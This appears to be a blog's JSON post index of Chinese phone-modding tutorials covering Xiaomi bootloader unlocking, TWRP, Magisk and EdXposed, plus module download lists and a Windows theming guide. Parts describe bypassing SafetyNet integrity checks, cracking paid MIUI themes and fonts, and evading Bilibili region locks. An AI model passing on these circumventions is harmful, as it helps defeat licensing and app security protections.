\"如何在无需解BL锁不ROOT的情况下刷官方系统？\")如何在无需解BL锁不ROOT的情况下刷官方系统？\n\n直接官方REC刷入官方ROM（全量包）：把官方刷机包放到手机根目录，进入设置-系统升级，点一下系统升级右上角的齿轮。选择本地升级，选择你刚才放入的官方刷机包，就跟平时升级一样的，不过降级建议恢复出厂设置。\n\n## [](#如何ROOT以及刷入第三方系统？ \"如何ROOT以及刷入第三方系统？\")如何ROOT以及刷入第三方系统？\n\n这两种操作的前提都是解BL锁和刷入第三方REC：TWRP。\n\n第一次ROOT和刷机需要电脑，看到这里，如果你的手机没有解过BL锁而且身边没有电脑，那么你现在可以暂时放弃学习这篇帖子了。\n\nROOT：（第一次的话解BL锁→刷入第三方REC：TWRP，以后不用进行此操作）→把ROOT包放在手机根目录，长按音量减和电源键，进入REC（recovery mode）,也就是TWRP界面安装ROOT包。（注意，安卓8.0系统的ROOT包只能选Magisk。)\n\n最常见的ROOT包有两种：supersu和Magisk。\n\n如果想卸载，直接卡刷卸载包\n\n刷入第三方系统：（第一次的话解BL锁→刷入第三方REC：TWRP，以后不用进行此操作）→把系统ROM包放在手机根目录，长按音量减和电源键，进入REC（recovery mode）,也就是TWRP界面，安装下载的系统ROM。\n","slug":"玩机汇总（一）：刷机常识，双清，BL，REC，TWRP","date":"2020-06-15T16:00:00.000Z","categories_index":"","tags_index":"玩机","author_index":"kif"},{"id":"24e5454169be4b7a3fe5b7eadbc33f5c","title":"玩机汇总（二）：小米手机解锁与刷开发版","content":"本文记录我几年的玩机记录和经验，以小米手机的玩机经验为主有变砖风险。玩机有风险，搞机需谨慎。\n\n手机解锁前言：手机解锁每个品牌都有不同的方法，华为的以前可以申请解锁码解锁，但之后直接关闭了解锁通道，所以华为手机可玩性不高。ov系一直没有开通root权限，oppo旗下子品牌realme（本人目前的手机）到有可以解锁的。魅族也有官方的解锁通道。本文以小米解锁为例。\n解锁即解bl锁，解除bl锁后我们就可以自由的刷机与刷入rec了，而如果我们不解锁，我们就只能通过有限的刷机方式来刷机，譬如通过官方rec进行更新，但是官方rec只能刷官方指定的刷机包，而如果想要刷入第三方刷机包都需要解除bl锁。\n 解除bl锁的教程：\n注意事项： 你必须要有小米账号，且小米账号在你的小米手机上登录了超过24个小时\n你需要一台电脑，一个usb数据线，原装的最好。\n如果你只是想刷开发版，可以下滑到刷开发版的教程，刷入开发版不需要解锁bl锁！\n解锁需要申请解锁码，申请后需要等待一到三个工作日，所以无法立即解锁。\n解锁后会清除数据，请先备份数据！解锁后会清除数据，请先备份数据！解锁后会清除数据，请先备份数据！解锁后会清除数据，请先备份数据！解锁后会清除数据，请先备份数据！\n下载解锁工具进入MIUI论坛，网址： 小米解锁地址\n点击立即解锁\n下载解锁工具到电脑，解压\n\nmiflash_unlock.exe 就是解锁程序。\n开启开发者模式打开手机，进入设置–我的设备–全部参数\n多次点击MIUI版本，知道弹窗显示“已进入开发者模式”\n回退到设置主界面 点开“更多设置”\n点击开发者选项（这里前面没有多次点击MIUI开启的话是没有这个选项的）\n开启开发者选项和USB调试\n这里插一句,这里有个设备解锁状态是可以看是否账号与手机绑定的，如果没有绑定，绑定后要24h后才能解锁\n连接手机解锁把手机关机，同时按住开机键和音量下键（音量减键）；\n按住7s后，手机会亮屏，如果屏幕是这个内容\n说明你已经进入Bootloader模式了。\n这时候，把手机用usb数据线连接到电脑上。\n打开解压工具，找到miflash_unlock，双击运行 同意免责条款后登陆小米账号 之后会验证是否支持解锁 \n之后点击解锁就好了\n\n刷入开发版miui下载刷机包下载地址：MIUI下载\n选择对应手机版本（以小米6为例）下载开发版安装包将手机连接电脑，划出状态栏，选择正在通过USB充电（如果在这之前你更改过设置，也有可能会是正在通过USB传输照片&#x2F;传输文件）打开此电脑，选择你的手机 找到downloaded_rom文件夹，并打开把你下载的开发版刷机包复制到downloaded_rom文件夹里，断开手机与电脑的连接。\n并保证手机有50%以上的电量。打开设置–我的设备  选择MIUI版本，在MIUI版本界面点击右上角\n选择手动选择刷机包，找到downloaded_rom，选择你的ROM，刷机即可。\n参考：小米手机解锁与刷开发版教程 - 八重樱的文章 - 知乎https://zhuanlan.zhihu.com/p/62107666\n","slug":"玩机汇总（二）：小米手机解锁与刷开发版","date":"2020-06-15T16:00:00.000Z","categories_index":"教程","tags_index":"玩机,MIUI","author_index":"kif"},{"id":"7145d95c80749bf0492096ab667fe71c","title":"玩机汇总（三）：刷入第三方rec 与magisk、Edx安装","content":"本文介绍手机第三方rec刷入和magisk、Edxp的安装有变砖风险。玩机有风险，搞机需谨慎。\n\n前言什么是第三方rec？Recovery模式指的是一种可以对安卓机内部的数据或系统进行修改的模式（类似于windows PE或DOS）。在这个模式下我们可以刷入新的安卓系统，或者对已有的系统进行备份或升级，也可以在此恢复出厂设置，按类型分为官方的rec和第三方rec（CWM REC和TWRP REC。REC是Recovery的缩写，是每部安卓机出厂时自带的恢复模式，不过那都是官方的Recovery。官方Recovery只能用来刷入官方的系统，如小米rec\n如果你想刷入别的系统，只能通过第三方Recovery来实现，但是，你平时所用到的在线升级也就是OTA升级，是基于官方Rec的，如果你刷入了第三方Rec，OTA升级就会失败。\nTWRPTWRP是国外android爱好者开发的一个第三方REC，全名是：TeamWin Recovery Project，也是我们现在刷第三方ROM通常用到的REC。twrp官网\n此教程是线刷rec教程\n什么是magisk？官网：https://magiskmanager.com/\nMagisk 是出自一位台湾学生 @topjohnwu 开发的 Android 框架，是一个通用的第三方 systemless 接口，通过这样的方式实现一些较强大的功能。看似很简单的一个框架，甚至与大名鼎鼎的 Xposed 框架在功能性上有点重复。很多人批评 Magisk的模块太少了，想替代 Xposed 根本不可能（在那个 Xposed Framework for Android 7.0 难产的时代，很多人将 Magisk 看是做是 Xposed 的替代品）。这是不正确的，因为 Magisk 从来没有想过要代替 Xposed ，Magisk 与 Xposed 是可以互相兼容的，你甚至可以通过 Magisk 来安装 Xposed（安装 Xposed 后就不能绕过 SafetyNet 了）。\nMagisk 的厉害之处在于它实现了一种绕过 SafetyNet 使用 root 的方法。\n实现原理：由于它是通过启动时在 boot 中创建钩子，把 &#x2F;data&#x2F;magisk.img 挂载到 &#x2F;magisk，构建出一个在 system 基础上能够自定义替换，增加以及删除的文件系统，所有操作都在启动的时候完成，实际上并没有对 &#x2F;system 分区进行修改（即 systemless 接口，以不触动 &#x2F;system 的方式修改 &#x2F;system）。\n转自：作者：Mogeko丶链接：https://www.jianshu.com/p/393f5e51716e来源：简书\n3.什么是Edxp?官网：https://github.com/ElderDrivers/EdXposed/releases/\n   Edxposed全称 Elder driver Xposed Framework，简称edxp.大名鼎鼎的xposed框架可以实现QQ抢红包，微信抢红包，防止消息撤回等功能。xposed也是所有android系统获取root后必装的东西。但可惜，自从android 7.0之后xposed的开发者rovo89基本就不维护了，针对android 8.0的版本草草发布了一个测试版本撒手不管了。现在越来越多的新机型出厂就是android 9.0系统，那么怎么才能继续使用xposed框架，如何才能继续快乐的抢红包呢？其实有办法！xposed虽然死了，但它却不再是唯一。比如今天我要提到的Edxposed框架，Edxposed全称 Elder driver Xposed Framework，简称edxp，Edxposed框架现在支持android 8.0 -android 9.0 ，如果是android 7.0或更早的版本，推荐使用xposed框架。针对框架的安装问题，官方推出了Magisk模块的安装方式，也就是提供了一个zip压缩包，在Magisk中安装重启即可。在安装edxposed的magisk模块之前，你需要先安装riru的magisk模块。本文主要是Magisk安装Edx。\n参考：作者：coderstory《后Xposed时代: 一篇文章看懂如何安装和使用Edxposed》https://blog.coderstory.cn/guide-install-edxposed/\n刷入第三方rec下载准备准备：电脑 数据线 手机 \n所需工具来自 rom乐园 参考教程：http://www.romleyuan.com/lec/read?id=201\n小米全机型TWRP一键刷机工具：\n百度网盘下载：https://pan.baidu.com/s/1K0VuCxwwKT9OI3yCouV3Gg高速下载，请关注微信公众号：ROM乐园 回复关键字：全机型recovery下载\ntwrp机型下载地址汇总链接：https://pan.baidu.com/s/1zIZ9ObMiKwjlW3LvpOixMw提取码：9kam\n刷入解压刷入RECOVERY工具并打开\n\n彻底关闭手机，音量下和开机按键进入fastboot模式双击运行一键刷入RECOVERY.bat脚本\n\n提示连接成功后，根据提示一步步刷完RECOVERY刷机完成后，会自动进入RECOVERY，或者提示进入RECOVERY方法\n小米手机进入TWRP_Recovery教程：开机状态下，选择重启手机，按住音量山不松手，即可进入TWRP_Recovery\n关机状态下，长开机键和音量上不松手，震动后松开开机按键，保持音量上\n不松手，等待手机自带进入twrp界面\n刷入magisk安装 Magisk 需要解锁 Bootloader 并刷入第三方 Recovery。所以每个品牌的手机都或多或少的有点不一样，这里只介绍一个标准的流程，\n下载准备网站下载magisk包；\n下面提供个人云盘的下载：magisk app:链接：https://pan.baidu.com/s/1YXTdIAbbp0xMoBT0UWFboA提取码：p15w\nmagisk v20.4链接：https://pan.baidu.com/s/1q6kBqFDuAVIQeQ2KRji0sw提取码：mzd5 \nmagisk卸载包 链接：https://pan.baidu.com/s/1UjigsfnuHwFpC1YkjNLrQQ提取码：6lg7\n下载 APP 和magisk v20.4 就好了\n方法首先将下好的magisk v20.4 包放入手机中\n进入第三方 Recovery（以 twrp 为例）\n\n安装刷机包  找到我让你放在硬盘中的那个包（后缀为 .zip）\n\n滑动滑块，开始刷机 \n\n刷好后立即重启。\n\n至此，magisk安装完毕。\n模块  magisk安装之后可以安装很多模块实现对手机的功能扩展。具体的模块分享会专门出一个板块。\n刷入 Edx下载准备：有了magisk之后安装Edxp相对比较简单，Edxp作为一个Magisk模块被刷入。以前需要刷入 Riru Core和Edx两个模块，但之后有大佬对模块进行了整合，这里分享的就是整合后的模块，用magisk输入后就可以了。\nMagisk模块-EdXposed完整框架v2.7Y版链接：https://pan.baidu.com/s/1oxvrpwnWLQWzoQJKYroOUw提取码：a9dk\n安装下载之后进入第三方rec ，找到模块安装重启之后一般就会出现 Edx的图标\n至此，Edxp安装完毕。\n模块Edxp  也有很多模块，模块分享会和Magisk模块一起发出。\n后话magisk 和Edxp是我个人用的比较多的，当然市面上还有太极之类的玩机软件也不错，有想法的可以去试试。\n此次教程参考转载了很多大佬的文章，主要在于自己表达水平不行，在此对这些大佬表示感谢。如有侵权，请联系我删除。\n","slug":"玩机汇总（三）：刷入第三方rec-与magisk、Edx安装","date":"2020-06-15T16:00:00.000Z","categories_index":"教程","tags_index":"玩机","author_index":"kif"},{"id":"f911d732c7d89965e741eb93a6aa7646","title":"玩机汇总（四）：magisk模块和Edxp模块分享","content":"本文介绍magisk模块和Edxp模块分享，均为网络资源为尊重原作者劳动成果，最大程度保证模块来自原作者分享网页在此对各个大佬表示感谢，如有问题，请联系我删除。\n\n前排提示：每个模块对每个手机兼容性无法保证，模块之间也有可能会有冲突，有变砖风险。玩机有风险，搞机需谨慎。\nmagisk 模块MM管理器-2018.09.16 汉化作者：链接：https://pan.baidu.com/s/14ZeKBRdC9DJly00FwkTXpg提取码：27wk功能：可在rec模式卸载已安装模块，可用来救砖。（高版本的第三方rec已具备此功能）\n小米 mixAlpha 机型模块作者：酷安 坏叔叔_hi网址（作者原分享网址）：https://www.lanzous.com/i9yvlkf?t功能：将手机型号修改为 MixAlpha\n更多机型模块可以在酷安侯旭Hxv主页寻找\nAD 影视 Hosts1.2作者：依然的爱网址：链接：https://pan.baidu.com/s/15-J1saudJheohBFJZpWyOg提取码：zr37功能：屏蔽各类广告包括(各大视频网站,运营商劫持广告，大部分APP广告),hosts规则均来自于网络搜索,github,人工抓取及酷友提供，使用时请关闭其他hosts模块,请关闭systemless hosts模块(如果有)。\nMagisk-超级快充2.0作者：链接：链接：https://pan.baidu.com/s/1Nj0ngsQkjMGeT0PvmWGllA提取码：p7m4功能：快充\nMagisk-毒液 完整版（适合开机慢）作者：链接：https://pan.baidu.com/s/14fz045q_CbY3bGgyvD7WDg提取码：a6nd功能：改变开机动画\nMagisk-黑域启动插件作者：链接：https://pan.baidu.com/s/1LeyI462PzAHSndWNelg9UQ提取码：2spa\nMagisk_浪漫雅圆+Sleek+Google(综合字体)作者：链接：https://pan.baidu.com/s/1rpOyQKVmI9dQIVwCC2ER4Q提取码：hq66功能：修改系统字体\n充电90％自动暂停作者：链接：https://pan.baidu.com/s/1Lgk4keO6oRAcMZIqLaxZ6Q提取码：jrtk功能：充电90％自动暂停\n其他个人收集模块链接：https://pan.baidu.com/s/1AdRqJlDClp0qKn9njXejzg提取码：r87o\n链接：https://pan.baidu.com/s/1Wx6CnfhOSTURk_72uf1mQg提取码：53tv\n！！玩机有风险，搞机需谨慎。！！\nEdxp模块edxp 上有模块下载，也可以去edxp上下载\n\n\n哔哩漫游作者：iAcn&#x2F;djytw&#x2F;yujincheng08哔哩漫游 (BiliRoaming) - http://repo.xposed.info/module/me.iacn.biliroaming功能：解除B站番剧区域限制港澳台CDN加速缓存番剧支持国际版和概念版自定义主题色关闭青少年模式弹窗显示评论区楼层概念版添加直播入口不以小程序形式分享\n网易云音乐插件作者：Specher网易云音乐插件 - http://repo.xposed.info/module/com.specher.music163功能：一个网易云音乐的Xposed插件。目前功能：自动签到、跳过启动广告、本地数据修改、美化功能。最佳适配4.3.X，理论任意版本通用\n云村清洁工作者：xmodule.org云村清洁工app是一款非常好用的网易云插件，需要XP框架，搭配食用非常舒服，避免提示应用升级重要：使用的是七牛云镜像下载，请勿在xposed install内下载！！！！请直接用浏览器访问： https://repo.xposed.info/module/me.zjns.lovecloudmusic下载\n1、禁止签到跳转商城；2、去除启动页，评论区等位置广告；3、伪装成谷歌版，避免提示升级。、\n涉及到各种CD问题，不再更新。你可以关注微信公众号: xmodule 回复: 云村清洁工 下载我最新编译的版本\nWeXposed （微X模块）作者：fkzhang\n\nhttp://repo.xposed.info/module/com.fkzhang.wechatxposed功能：-防止微信撤回消息\n转发微信聊天里的图片和小视频到朋友圈\n转发聊天里的多张图片（最多9张）到朋友圈\n转发语音给朋友\n转发收藏内容\n转发朋友圈里的内容到自己的朋友圈\n分享图片和小视频\n屏蔽群聊成员\n自动查找僵尸粉\n批量删除好友\n批量删除僵尸粉\n自动回复\n自定义表情最高限额\n自动领取红包、转账\n等等。。。\n\n请谨慎使用自动领取红包功能！\nQXposed （QX模块）作者：fkzhang http://repo.xposed.info/module/com.fkzhang.qqxposed功能：-防止QQ撤回消息-自动领取红包-控制骰子-支持TIM\nchimi作者：yonhhen链接：https://github.com/yonghen/chimi-/releases功能：MIUI主题破解\nMIUI主题防恢复作者：夢月時歌链接https://www.wenshushu.cn/f/2s1mm0vm3bx功能：启MIUI主题破解模块，有效防止主题自动恢复默认。可用第三方主题，免费使用付费字体。\n","slug":"玩机汇总（四）：magisk模块和Edxp模块分享","date":"2020-06-15T16:00:00.000Z","categories_index":"教程","tags_index":"玩机","author_index":"kif"},{"id":"a991a875fbaf9a01b5d4b6a56c6eb178","title":"win桌面美化教程","content":"win桌面美化教程Win桌面美化教程在这记录下个人win 美化入坑的一些经验，主要是怕自己以后忘了怎么搞的 \n more\n先上一波成品图\n\n​目录​1.文件rainmeter :链接：https://pan.baidu.com/s/1lgWzoQYrZwnBk1uUB2bgJA 提取码：35272.配置美化主要需要 win主题，rainmeter， 透明状态栏等等东西2.1 注意事项为避免造成错误，一般最好先关闭各种安全软件，创建系统还原点右击“我的电脑” 点击“属性”​点击“系统保护” 点击“创建”\n随便输入，点击创建，等待一会就创建好了\n创建系统还原点的目的是备份下之前的设置，以便以后想恢复的时候恢复\n2.2 rainmeter 安装与使用Rainmeter是一款美化桌面的软件，可以加载各种桌面摆件：天气，时间，快捷方式，RSS，播放器，系统信息监控等安装并运行 Rainmeter 程序，即可双击雨滴皮肤运行，部分雨滴皮肤是文件夹式的，复制到C:\\Users\\用户名\\Documents\\Rainmeter\\Skins内，在任务栏托盘处找到白色小水滴的图标，双击打开配置面板，在左侧选择.ini文件，选择加载。比较占用系统资源，老爷机谨慎安装；新手在安装时不要选择便携模式，否则无法正常安装皮肤。下面是我收集到的一些插件包（资源来自网络，侵删）使用方法：解压到C:\\Users\\用户名\\Documents\\Rainmeter\\Skins目录下，在rainmeter 管理器里安装就好了，桌面上课一拖到任意位置\n时钟插件 链接：https://pan.baidu.com/s/1S2tf6RUv2fK_-yVFQ-sdvQ 提取码：1tpe频谱和时间 链接：https://pan.baidu.com/s/1aIdue3BuPRKk_HgTnSkl-A 提取码：9kb9布卡娘 链接：https://pan.baidu.com/s/1ePNvoTSX1FvYkqx0dHB11A 提取码：iyko侧边栏 链接：https://pan.baidu.com/s/1YMuRB9hzRITqdmya_W2Nhw 提取码：egia皮肤 链接：https://pan.baidu.com/s/1nDnacaIoY9Tt7YPh1kzh2A 提取码：zaa82.3 透明化状态栏这个就是一个软件达到的效果软件名： TranslucentTB下载：链接：https://pan.baidu.com/s/14K4zASY82_TByhgTq9mDGA 提取码：axer2.4 然后就是一些好康的壁纸了！！链接：https://pan.baidu.com/s/1sxkKiuqJBbpJm6rTWP-PDg 提取码：m731魔法阵 链接：https://pan.baidu.com/s/1tD5ZI0-zIqnlfv18P__DEQ 提取码：6dkd\n2.5 仿mac状态栏就是动图中那个东西，也只是一个软件达到的效果软件名:mydock链接：https://pan.baidu.com/s/1RDH85lhHjFxo2ye342vKLg 提取码：xljl—————————————–END——————————有时间的话在写一下自定义磁贴的\n","slug":"win桌面美化教程","date":"2020-06-12T16:00:00.000Z","categories_index":"教程","tags_index":"Win","author_index":"kif"}]